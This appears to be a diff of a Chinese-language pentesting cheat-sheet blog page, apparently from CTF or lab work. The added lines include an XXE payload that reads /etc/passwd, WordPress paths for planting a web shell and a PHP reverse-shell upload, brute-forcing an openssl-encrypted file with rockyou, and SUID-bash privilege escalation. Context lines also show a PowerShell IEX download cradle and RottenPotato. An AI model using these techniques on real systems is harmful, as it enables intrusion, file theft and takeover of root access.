@@ -285,21 +285,21 @@ nmap -p- ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-10-26
+                    2022-10-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.4k
+                    2.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    13 分
                 </div>
                 
 
@@ -385,6 +385,8 @@ pass mindy
 
 list 列出邮件数
 retr <span class="token number">1</span> 查看第一封邮件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看隐藏文件
+<span class="token function">dir</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="dig查询DNS-记录"><a href="#dig查询DNS-记录" class="headerlink" title="dig查询DNS 记录"></a>dig查询DNS 记录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> @ip 域名
 <span class="token function">dig</span> @ip 域名 any
 <span class="token function">dig</span> axfr @ip 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -564,7 +566,10 @@ ssh隧道端口映射
 获取所有文件的列表
 
 -n <span class="token number">10</span>指定最小的字符串长度
-strings -n <span class="token number">10</span> tester.exe <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+strings -n <span class="token number">10</span> tester.exe <span class="token operator">|</span> <span class="token function">less</span>
+
+取得root交互shell
+<span class="token function">sudo</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="使用已保存脚本提权"><a href="#使用已保存脚本提权" class="headerlink" title="使用已保存脚本提权"></a>使用已保存脚本提权</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
@@ -644,6 +649,36 @@ powershell.exe -c IEX<span class="token punctuation">(</span>New-Object Net.WebC
 C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>MSFRottenPotato.exe * C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>a.bat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">配置文件
 /etc/apache2/sites-available/000-default.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="xml-local-file-inclusion"><a href="#xml-local-file-inclusion" class="headerlink" title="xml local file inclusion"></a>xml local file inclusion</h2><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lfi</span> <span class="token punctuation">[</span><span class="token internal-subset">
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lfi</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>
+  &lt;!ENTITY boo SYSTEM
+  "file:///etc/passwd">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lfi</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&boo;">&amp;boo;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lfi</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="一些git命令"><a href="#一些git命令" class="headerlink" title="一些git命令"></a>一些git命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log
+<span class="token function">git</span> log -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="openssl加解密"><a href="#openssl加解密" class="headerlink" title="openssl加解密"></a>openssl加解密</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>file .drupal.txt.enc         
+.drupal.txt.enc: openssl enc<span class="token string">'d data with salted password, base64 encoded
+
+>base64 -d .drupal.txt.enc > a.txt
+>file a.txt          
+a.txt: openssl enc'</span>d data with salted password
+
+<span class="token operator">></span>bruteforce-salted-openssl -t <span class="token number">50</span> -f /usr/share/wordlists/rockyou.txt -d sha256 a.txt
+<span class="token operator">></span>openssl aes-256-cbc -d -a -in .drupal.txt.enc -out b.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="jar包反编译"><a href="#jar包反编译" class="headerlink" title="jar包反编译"></a>jar包反编译</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unzip解压jar包
+jd-gui打开class文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="wordpress各种路径"><a href="#wordpress各种路径" class="headerlink" title="wordpress各种路径"></a>wordpress各种路径</h2><p>/wp-content/plugins/[插件名]/[一句话木马文件名]</p>
+<p>/wp-content/themes/[主题名]/[一句话木马文件名]</p>
+<p>编辑主题404页面也可</p>
+<p>上传主题处上传php-re.php，访问下面的路径（时间改为上传的年月）</p>
+<p>/wp-content/uploads/2022/10/php-re.php</p>
+<h2 id="赋予SUID权限"><a href="#赋予SUID权限" class="headerlink" title="赋予SUID权限"></a>赋予SUID权限</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +s /bin/bash 让执行该命令的用户以该命令拥有者的权限去执行
+/bin/bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
             </div>
@@ -881,6 +916,8 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
 
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
+
+<!-- 代码块全屏 -->
 
 
     </div>
